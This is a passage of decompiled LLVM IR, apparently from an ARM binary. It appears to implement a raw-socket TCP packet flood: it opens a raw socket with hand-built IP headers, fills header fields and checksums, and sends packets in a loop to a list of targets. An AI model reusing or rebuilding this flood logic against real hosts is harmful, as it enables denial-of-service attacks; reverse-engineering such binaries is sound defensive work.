  %v1_cb5c = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v0_cb54, 256
  %v4_cb60 = urem i32 %tmp86, 256
  %v5_cb60 = or i32 %v4_cb60, %v1_cb5c
  store i32 %v5_cb60, i32* @r8, align 4
  store i32 %v4_c4b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_c698, i32* %ip.global-to-local, align 4
  %v7_cb74 = load i32, i32* %v2_c4b0, align 4
  store i32 %v7_cb74, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_cb7c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_cb88 = add i32 %v7_cb74, 20
  store i32 %v1_cb88, i32* @r5, align 4
  br i1 %v3_cb7c, label %dec_label_pc_ccb0, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cc90, %dec_label_pc_cb54
  %v0_cb98 = phi i32 [ %v7_cc9c, %dec_label_pc_cc90 ], [ %v7_cb74, %dec_label_pc_cb54 ]
  store i32 %v1_c640, i32* %lr.global-to-local, align 4
  store i1 %v2_cb94, i1* %cpsr_z.global-to-local, align 1
  %v1_cb98 = add i32 %v0_cb98, 40
  store i32 %v1_cb98, i32* %r0.global-to-local, align 4
  %v0_cb9c = load i32, i32* @sb, align 4
  store i32 %v0_cb9c, i32* @r1, align 4
  br i1 %v2_cb94, label %dec_label_pc_cba4, label %dec_label_pc_ccd4

dec_label_pc_cba4:                                ; preds = %dec_label_pc_cb90, %dec_label_pc_ccb0, %dec_label_pc_ccd4
  %v2_cba4 = phi i32 [ %v0_cb98, %dec_label_pc_cb90 ], [ %v0_ccc8, %dec_label_pc_ccb0 ], [ %v2_cba4.pre, %dec_label_pc_ccd4 ]
  %v0_cba4 = load i32, i32* @r6, align 4
  %v1_cba4 = trunc i32 %v0_cba4 to i8
  %v3_cba4 = add i32 %v2_cba4, 10
  %v4_cba4 = inttoptr i32 %v3_cba4 to i8*
  store i8 %v1_cba4, i8* %v4_cba4, align 1
  %v0_cba8 = load i32, i32* @r6, align 4
  %v1_cba8 = trunc i32 %v0_cba8 to i8
  %v2_cba8 = load i32, i32* @r4, align 4
  %v3_cba8 = add i32 %v2_cba8, 11
  %v4_cba8 = inttoptr i32 %v3_cba8 to i8*
  store i8 %v1_cba8, i8* %v4_cba8, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cbb0 = load i32, i32* @r4, align 4
  store i32 %v0_cbb0, i32* @r0, align 4
  %v2_cbb4 = call i32 @function_f17c(i32 %v0_cbb0, i32 20)
  %v3_cbb4 = trunc i32 %v2_cbb4 to i8
  store i32 %v2_cbb4, i32* %r0.global-to-local, align 4
  %v3_cbb8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v4_c4a0, i32* %r2.global-to-local, align 4
  %v3_cbc0 = mul i32 %v3_cbb8, 16
  %v2_cbc4 = add i32 %v3_cbc0, %v4_c4a0
  store i32 %v2_cbc4, i32* %r1.global-to-local, align 4
  %v1_cbc8 = add i32 %v2_cbc4, 4
  %v2_cbc8 = inttoptr i32 %v1_cbc8 to i32*
  %v3_cbc8 = load i32, i32* %v2_cbc8, align 4
  %v3_cbcc = mul i32 %v3_cbc8, 65536
  store i32 %v3_cbcc, i32* %ip.global-to-local, align 4
  %tmp87 = mul i32 %v3_cbc8, 256
  %v1_cbd4 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_cbc8, 256
  %v4_cbd8 = urem i32 %tmp88, 256
  %v5_cbd8 = or i32 %v4_cbd8, %v1_cbd4
  store i32 %v5_cbd8, i32* %r2.global-to-local, align 4
  %v1_cbdc = add i32 %v3_cbc8, 1
  store i32 %v1_cbdc, i32* %r3.global-to-local, align 4
  store i32 %v1_cbdc, i32* %v2_cbc8, align 4
  %v0_cbe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_cbe4 = load i32, i32* @r5, align 4
  %v2_cbe4 = add i32 %v1_cbe4, 4
  %v3_cbe4 = inttoptr i32 %v2_cbe4 to i32*
  store i32 %v0_cbe4, i32* %v3_cbe4, align 4
  %v0_cbe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cbe8 = add i32 %v0_cbe8, 8
  %v2_cbe8 = inttoptr i32 %v1_cbe8 to i32*
  %v3_cbe8 = load i32, i32* %v2_cbe8, align 4
  %tmp89 = mul i32 %v3_cbe8, 256
  %v1_cbf4 = and i32 %tmp89, 65280
  %tmp90 = udiv i32 %v3_cbe8, 256
  %v4_cbf8 = urem i32 %tmp90, 256
  %v5_cbf8 = or i32 %v4_cbf8, %v1_cbf4
  store i32 %v5_cbf8, i32* %r2.global-to-local, align 4
  %v4_cbfc29 = udiv i32 %v2_cbb4, 256
  %v1_cc00 = trunc i32 %v4_cbfc29 to i8
  %v2_cc00 = load i32, i32* @r4, align 4
  %v3_cc00 = add i32 %v2_cc00, 11
  %v4_cc00 = inttoptr i32 %v3_cc00 to i8*
  store i8 %v1_cc00, i8* %v4_cc00, align 1
  %v3_cc04 = load i32, i32* @r4, align 4
  %v4_cc04 = add i32 %v3_cc04, 10
  %v5_cc04 = inttoptr i32 %v4_cc04 to i8*
  store i8 %v3_cbb4, i8* %v5_cc04, align 1
  %v0_cc08 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc08 = load i32, i32* @r5, align 4
  %v2_cc08 = add i32 %v1_cc08, 8
  %v3_cc08 = inttoptr i32 %v2_cc08 to i32*
  store i32 %v0_cc08, i32* %v3_cc08, align 4
  %v0_cc0c = load i32, i32* @r5, align 4
  store i32 %v0_cc0c, i32* @r1, align 4
  %v0_cc10 = load i32, i32* @r8, align 4
  store i32 %v0_cc10, i32* %r2.global-to-local, align 4
  %v0_cc14 = load i32, i32* @r7, align 4
  store i32 %v0_cc14, i32* %r3.global-to-local, align 4
  %v0_cc18 = load i32, i32* @r4, align 4
  store i32 %v0_cc18, i32* %r0.global-to-local, align 4
  %v0_cc1c = load i32, i32* @r6, align 4
  %v1_cc1c = trunc i32 %v0_cc1c to i8
  %v3_cc1c = add i32 %v0_cc0c, 16
  %v4_cc1c = inttoptr i32 %v3_cc1c to i8*
  store i8 %v1_cc1c, i8* %v4_cc1c, align 1
  %v0_cc20 = load i32, i32* @r6, align 4
  %v1_cc20 = trunc i32 %v0_cc20 to i8
  %v2_cc20 = load i32, i32* @r5, align 4
  %v3_cc20 = add i32 %v2_cc20, 17
  %v4_cc20 = inttoptr i32 %v3_cc20 to i8*
  store i8 %v1_cc20, i8* %v4_cc20, align 1
  %v4_cc24 = call i32 @function_f1d8(i32 %v0_cc18, i32 %v0_cc0c, i32 %v0_cc10, i32 %v0_cc14)
  %v5_cc24 = trunc i32 %v4_cc24 to i8
  store i32 %v4_cc24, i32* %r0.global-to-local, align 4
  %v4_cc2830 = udiv i32 %v4_cc24, 256
  %v1_cc2c = trunc i32 %v4_cc2830 to i8
  %v2_cc2c = load i32, i32* @r5, align 4
  %v3_cc2c = add i32 %v2_cc2c, 17
  %v4_cc2c = inttoptr i32 %v3_cc2c to i8*
  store i8 %v1_cc2c, i8* %v4_cc2c, align 1
  %v3_cc30 = load i32, i32* @r5, align 4
  %v4_cc30 = add i32 %v3_cc30, 16
  %v5_cc30 = inttoptr i32 %v4_cc30 to i8*
  store i8 %v5_cc24, i8* %v5_cc30, align 1
  %v3_cc34 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cc34, i32* %r3.global-to-local, align 4
  %v0_cc38 = load i32, i32* @r4, align 4
  %v1_cc38 = add i32 %v0_cc38, 20
  %v2_cc38 = inttoptr i32 %v1_cc38 to i32*
  %v3_cc38 = load i32, i32* %v2_cc38, align 4
  %v5_cc40 = mul i32 %v3_cc34, 24
  %v3_cc48 = udiv i32 %v3_cc38, 65536
  store i32 %v3_cc48, i32* %r2.global-to-local, align 4
  %v2_cc4c = add i32 %v5_cc40, %arg2
  store i32 %v2_cc4c, i32* %ip.global-to-local, align 4
  %v3_cc505 = udiv i32 %v3_cc38, 16777216
  %v1_cc54 = trunc i32 %v3_cc505 to i8
  %v3_cc54 = add i32 %v2_cc4c, 3
  %v4_cc54 = inttoptr i32 %v3_cc54 to i8*
  store i8 %v1_cc54, i8* %v4_cc54, align 1
  %v0_cc58 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc58 = trunc i32 %v0_cc58 to i8
  %v2_cc58 = load i32, i32* %ip.global-to-local, align 4
  %v3_cc58 = add i32 %v2_cc58, 2
  %v4_cc58 = inttoptr i32 %v3_cc58 to i8*
  store i8 %v1_cc58, i8* %v4_cc58, align 1
  %v0_cc5c = load i32, i32* @r4, align 4
  store i32 %v0_cc5c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c650, i32* %r0.global-to-local, align 4
  %v0_cc68 = load i32, i32* @sl, align 4
  store i32 %v0_cc68, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_cc70 = load i32, i32* %ip.global-to-local, align 4
  %v4_cc70 = inttoptr i32 %v0_cc70 to %sockaddr*
  %v7_cc78 = inttoptr i32 %v0_cc5c to i32*
  %v9_cc78 = call i32 @sendto(i32 %v3_c650, i32* %v7_cc78, i32 %v0_cc68, i32 16384, %sockaddr* %v4_cc70, i32 16)
  %v3_cc7c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cc7c, i32* %r3.global-to-local, align 4
  %v1_cc80 = add i32 %v3_cc7c, 1
  store i32 %v1_cc80, i32* %r0.global-to-local, align 4
  %v1_cc84 = load i32, i32* @fp, align 4
  %v9_cc84 = icmp eq i32 %v1_cc80, %v1_cc84
  store i1 %v9_cc84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cc80, i32* %stack_var_-40, align 4
  %v6_cc8c = icmp slt i32 %v1_cc80, %v1_cc84
  br i1 %v6_cc8c, label %dec_label_pc_cc90, label %dec_label_pc_cb48

dec_label_pc_cc90:                                ; preds = %dec_label_pc_cba4
  store i32 %v4_c4b0, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_c698, i32* %ip.global-to-local, align 4
  %v4_cc9c = mul i32 %v1_cc80, 4
  %v5_cc9c = add i32 %v4_cc9c, %v4_c4b0
  %v6_cc9c = inttoptr i32 %v5_cc9c to i32*
  %v7_cc9c = load i32, i32* %v6_cc9c, align 4
  store i32 %v7_cc9c, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_cb7c, i1* %cpsr_z.global-to-local, align 1
  %v1_cca8 = add i32 %v7_cc9c, 20
  store i32 %v1_cca8, i32* @r5, align 4
  br i1 %v3_cb7c, label %dec_label_pc_ccb0, label %dec_label_pc_cb90

dec_label_pc_ccb0:                                ; preds = %dec_label_pc_cc90, %dec_label_pc_cb54
  %v0_ccb0 = call i32 @function_10b68()
  %v1_ccb0 = trunc i32 %v0_ccb0 to i8
  store i32 %v1_c640, i32* %lr.global-to-local, align 4
  %v4_ccb8 = sdiv i32 %v0_ccb0, 256
  store i32 %v4_ccb8, i32* %r3.global-to-local, align 4
  store i1 %v2_cb94, i1* %cpsr_z.global-to-local, align 1
  %v3_ccc0 = load i32, i32* @r4, align 4
  %v4_ccc0 = add i32 %v3_ccc0, 4
  %v5_ccc0 = inttoptr i32 %v4_ccc0 to i8*
  store i8 %v1_ccb0, i8* %v5_ccc0, align 1
  %v0_ccc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_ccc4 = trunc i32 %v0_ccc4 to i8
  %v2_ccc4 = load i32, i32* @r4, align 4
  %v3_ccc4 = add i32 %v2_ccc4, 5
  %v4_ccc4 = inttoptr i32 %v3_ccc4 to i8*
  store i8 %v1_ccc4, i8* %v4_ccc4, align 1
  %v0_ccc8 = load i32, i32* @r4, align 4
  %v1_ccc8 = add i32 %v0_ccc8, 40
  store i32 %v1_ccc8, i32* %r0.global-to-local, align 4
  %v0_cccc = load i32, i32* @sb, align 4
  store i32 %v0_cccc, i32* @r1, align 4
  %v0_ccd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ccd0, label %dec_label_pc_cba4, label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cb90, %dec_label_pc_ccb0
  %v0_ccd4 = phi i32 [ %v1_cb98, %dec_label_pc_cb90 ], [ %v1_ccc8, %dec_label_pc_ccb0 ]
  %v1_ccd4 = inttoptr i32 %v0_ccd4 to i8*
  %v2_ccd4 = call i32 @function_10d44(i8* %v1_ccd4)
  store i32 %v2_ccd4, i32* %r0.global-to-local, align 4
  %v2_cba4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cba4

; uselistorder directives
  uselistorder i32 %v0_ccc8, { 1, 0 }
  uselistorder i32 %v7_cc9c, { 1, 2, 0 }
  uselistorder i32 %v1_cc84, { 1, 2, 0 }
  uselistorder i32 %v1_cc80, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_cc24, { 0, 2, 1 }
  uselistorder i32 %v0_cc0c, { 1, 0, 2 }
  uselistorder i32 %v3_cbe8, { 1, 0 }
  uselistorder i32 %v3_cbc8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_cbb4, { 0, 2, 1 }
  uselistorder i32 %v0_cb98, { 1, 0 }
  uselistorder i32 %v0_cb54, { 1, 0 }
  uselistorder i32 %v0_cb48, { 1, 0 }
  uselistorder i1 %v3_cb7c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_cb30, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ca84, { 0, 2, 1 }
  uselistorder i32 %v3_ca64, { 1, 0 }
  uselistorder i32 %v0_ca38, { 1, 0, 2 }
  uselistorder i32 %v3_ca2c, { 1, 0 }
  uselistorder i32 %v3_c9c0, { 1, 0 }
  uselistorder i32 %v0_c9b4, { 1, 0 }
  uselistorder i32 %v3_c93c, { 1, 0 }
  uselistorder i32 %v2_c928, { 1, 0 }
  uselistorder i32 %v3_c90c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c904, { 1, 0 }
  uselistorder i32 %v3_c8e0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_c8d8, { 1, 0 }
  uselistorder i32 %v4_c8c0, { 1, 0 }
  uselistorder i32 %v0_c8bc, { 0, 2, 1 }
  uselistorder i1 %v7_c82c, { 1, 0 }
  uselistorder i32 %v10_c824, { 0, 2, 1, 3 }
  uselistorder i32 %v5_c870, { 1, 0 }
  uselistorder i1 %v9_c854, { 1, 0 }
  uselistorder i32 %v4_c868, { 1, 0 }
  uselistorder i32 %v4_c864, { 1, 0 }
  uselistorder i32 %storemerge26, { 0, 2, 1 }
  uselistorder i32 %v8_c778, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c764, { 1, 0 }
  uselistorder i32 %v7_c730, { 4, 1, 3, 2, 0, 5 }
  uselistorder i1 %v7_c6dc, { 1, 0 }
  uselistorder i32 %v3_c6d8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_caf0, { 1, 0 }
  uselistorder i32 %v1_cad8, { 1, 0 }
  uselistorder i32 %v1_cac0, { 1, 0 }
  uselistorder i32 %v1_caa8, { 1, 0 }
  uselistorder i32 %v1_ca90, { 1, 0 }
  uselistorder i32 %v5_c86c, { 1, 0 }
  uselistorder i32 %v3_c7c095, { 1, 0 }
  uselistorder i1 %v2_c884, { 1, 0 }
  uselistorder i32 %v1_c880, { 1, 0 }
  uselistorder i32 %v4_c87c, { 2, 0, 1 }
  uselistorder i32 %v4_c860, { 1, 0 }
  uselistorder i1 %v3_c7a8, { 1, 0 }
  uselistorder i32 %v8_c6a4, { 2, 1, 0 }
  uselistorder i32 %v8_c6a0, { 1, 2, 0 }
  uselistorder i32 %v3_c698, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_c694, { 0, 1, 3, 2 }
  uselistorder i1 %v7_c688, { 1, 0 }
  uselistorder i1 %v7_c658, { 1, 0 }
  uselistorder i32 %v3_c654, { 2, 0, 1 }
  uselistorder i32 %v3_c650, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_c640, { 1, 3, 2, 0 }
  uselistorder i32 %v1_c5e8, { 1, 0 }
  uselistorder i32 %v1_c5c8, { 1, 0 }
  uselistorder i32 %v1_c5a8, { 1, 0 }
  uselistorder i32 %v1_c588, { 1, 0 }
  uselistorder i32 %v1_c568, { 1, 0 }
  uselistorder i32 %v1_c530, { 1, 0 }
  uselistorder i32 %v4_c4b0, { 0, 3, 4, 1, 2 }
  uselistorder i32 %v4_c4a0, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_c484, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 19, 12, 13, 14, 15, 16, 17, 18, 23, 20, 21, 22, 24, 26, 25, 28, 27, 31, 29, 32, 33, 30, 34, 36, 35, 37, 38, 40, 39, 44, 41, 42, 43, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_ccd4, { 1, 0 }
  uselistorder label %dec_label_pc_cba4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb2c, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_c8b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c7ec, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_c79c, { 1, 0 }
}

define i32 @function_cce0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cce0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_cce0 = load i32, i32* @r4, align 4
  %v1_cce4 = urem i32 %arg1, 256
  store i32 %v1_cce4, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_ccfc = urem i32 %arg3, 256
  store i32 %v1_ccfc, i32* @r4, align 4
  %v2_cd00 = call i32* @calloc(i32 %v1_cce4, i32 4)
  %v4_cd00 = ptrtoint i32* %v2_cd00 to i32
  %v0_cd04 = load i32, i32* @r5, align 4
  store i32 %v0_cd04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r4, align 4
  %v5_cd18 = inttoptr i32 %v0_cd04 to i32*
  %v6_cd18 = call i32 @function_b240(i32 %v0_cd14, i32* %v5_cd18, i32 2, i32 0)
  %v1_cd24 = urem i32 %v6_cd18, 256
  store i32 %v1_cd24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cd30 = load i32, i32* @r5, align 4
  store i32 %v0_cd30, i32* %r1.global-to-local, align 4
  %v0_cd34 = load i32, i32* @r4, align 4
  %v5_cd38 = trunc i32 %v6_cd18 to i8
  %v6_cd3c = inttoptr i32 %v0_cd30 to i32*
  %v7_cd3c = call i32 @function_b240(i32 %v0_cd34, i32* %v6_cd3c, i32 3, i32 65535)
  %v0_cd40 = load i32, i32* @r5, align 4
  store i32 %v0_cd40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_cd3c, i32* @r8, align 4
  %v0_cd50 = load i32, i32* @r4, align 4
  %v4_cd54 = inttoptr i32 %v0_cd40 to i32*
  %v5_cd54 = call i32 @function_b240(i32 %v0_cd50, i32* %v4_cd54, i32 4, i32 64)
  %v1_cd5c = urem i32 %v5_cd54, 256
  store i32 %v1_cd5c, i32* %ip.global-to-local, align 4
  %v0_cd60 = load i32, i32* @r5, align 4
  store i32 %v0_cd60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cd6c = load i32, i32* @r4, align 4
  %v6_cd74 = inttoptr i32 %v0_cd60 to i32*
  %v7_cd74 = call i32 @function_b240(i32 %v0_cd6c, i32* %v6_cd74, i32 5, i32 0)
  %v1_cd80 = urem i32 %v7_cd74, 256
  store i32 %v1_cd80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v0_cd8c, i32* %r1.global-to-local, align 4
  %v0_cd90 = load i32, i32* @r4, align 4
  %v5_cd98 = inttoptr i32 %v0_cd8c to i32*
  %v6_cd98 = call i32 @function_b240(i32 %v0_cd90, i32* %v5_cd98, i32 6, i32 65535)
  %v0_cda0 = load i32, i32* @r5, align 4
  store i32 %v0_cda0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_cd98, i32* @r7, align 4
  %v0_cdb0 = load i32, i32* @r4, align 4
  %v4_cdb4 = inttoptr i32 %v0_cda0 to i32*
  %v5_cdb4 = call i32 @function_b240(i32 %v0_cdb0, i32* %v4_cdb4, i32 7, i32 65535)
  %v0_cdbc = load i32, i32* @r5, align 4
  store i32 %v0_cdbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_cdb4, i32* @r6, align 4
  %v0_cdcc = load i32, i32* @r4, align 4
  %v4_cdd0 = inttoptr i32 %v0_cdbc to i32*
  %v5_cdd0 = call i32 @function_b240(i32 %v0_cdcc, i32* %v4_cdd0, i32 17, i32 65535)
  %v0_cddc = load i32, i32* @r5, align 4
  store i32 %v0_cddc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_cde8 = load i32, i32* @r4, align 4
  %v5_cdec = inttoptr i32 %v0_cddc to i32*
  %v6_cdec = call i32 @function_b240(i32 %v0_cde8, i32* %v5_cdec, i32 18, i32 65535)
  %v0_cdf0 = load i32, i32* @r5, align 4
  store i32 %v0_cdf0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce00 = load i32, i32* @r4, align 4
  %v5_ce04 = inttoptr i32 %v0_cdf0 to i32*
  %v6_ce04 = call i32 @function_b240(i32 %v0_ce00, i32* %v5_ce04, i32 11, i32 0)
  %v0_ce08 = load i32, i32* @r5, align 4
  store i32 %v0_ce08, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ce18 = load i32, i32* @r4, align 4
  %v5_ce1c = inttoptr i32 %v0_ce08 to i32*
  %v6_ce1c = call i32 @function_b240(i32 %v0_ce18, i32* %v5_ce1c, i32 12, i32 1)
  %v0_ce20 = load i32, i32* @r5, align 4
  store i32 %v0_ce20, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce30 = load i32, i32* @r4, align 4
  %v5_ce34 = inttoptr i32 %v0_ce20 to i32*
  %v6_ce34 = call i32 @function_b240(i32 %v0_ce30, i32* %v5_ce34, i32 13, i32 0)
  %v0_ce38 = load i32, i32* @r5, align 4
  store i32 %v0_ce38, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce48 = load i32, i32* @r4, align 4
  %v5_ce4c = inttoptr i32 %v0_ce38 to i32*
  %v6_ce4c = call i32 @function_b240(i32 %v0_ce48, i32* %v5_ce4c, i32 14, i32 0)
  %v0_ce50 = load i32, i32* @r5, align 4
  store i32 %v0_ce50, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce60 = load i32, i32* @r4, align 4
  %v5_ce64 = inttoptr i32 %v0_ce50 to i32*
  %v6_ce64 = call i32 @function_b240(i32 %v0_ce60, i32* %v5_ce64, i32 15, i32 0)
  %v0_ce68 = load i32, i32* @r5, align 4
  store i32 %v0_ce68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ce78 = load i32, i32* @r4, align 4
  %v5_ce7c = inttoptr i32 %v0_ce68 to i32*
  %v6_ce7c = call i32 @function_b240(i32 %v0_ce78, i32* %v5_ce7c, i32 16, i32 0)
  %v0_ce80 = load i32, i32* @r5, align 4
  store i32 %v0_ce80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ce90 = load i32, i32* @r4, align 4
  %v5_ce94 = inttoptr i32 %v0_ce80 to i32*
  %v6_ce94 = call i32 @function_b240(i32 %v0_ce90, i32* %v5_ce94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cea4 = load i32, i32* @r5, align 4
  store i32 %v0_cea4, i32* %r1.global-to-local, align 4
  %v0_cea8 = load i32, i32* @r4, align 4
  %v4_ceac = inttoptr i32 %v0_cea4 to i32*
  %v5_ceac = call i32 @function_b240(i32 %v0_cea8, i32* %v4_ceac, i32 1, i32 1)
  %v2_ceb8 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_ceb8, i32* %r3.global-to-local, align 4
  %v1_cebc = urem i32 %v5_ceac, 256
  store i32 %v1_cebc, i32* %ip.global-to-local, align 4
  %v0_cec0 = load i32, i32* @r5, align 4
  store i32 %v0_cec0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_cec8 = load i32, i32* @r4, align 4
  %v5_ced0 = inttoptr i32 %v0_cec0 to i32*
  %v6_ced0 = call i32 @function_b1d4(i32 %v0_cec8, i32* %v5_ced0, i32 25, i32 %v2_ceb8, i32 %v1_cebc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_cee4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_cee8 = icmp eq i32 %v3_cee4, -1
  store i1 %v7_cee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cee8, label %dec_label_pc_d320, label %dec_label_pc_cef4

dec_label_pc_cef4:                                ; preds = %dec_label_pc_cce0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_cefc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_cefc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_cf10 = call i32 @setsockopt(i32 %v3_cee4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v7_cf14 = icmp eq i32 %v7_cf10, -1
  store i1 %v7_cf14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cf14, label %dec_label_pc_d318, label %dec_label_pc_cf1c

dec_label_pc_cf1c:                                ; preds = %dec_label_pc_cef4
  %v0_cf1c = load i32, i32* @r8, align 4
  %v0_cf20 = load i32, i32* @r7, align 4
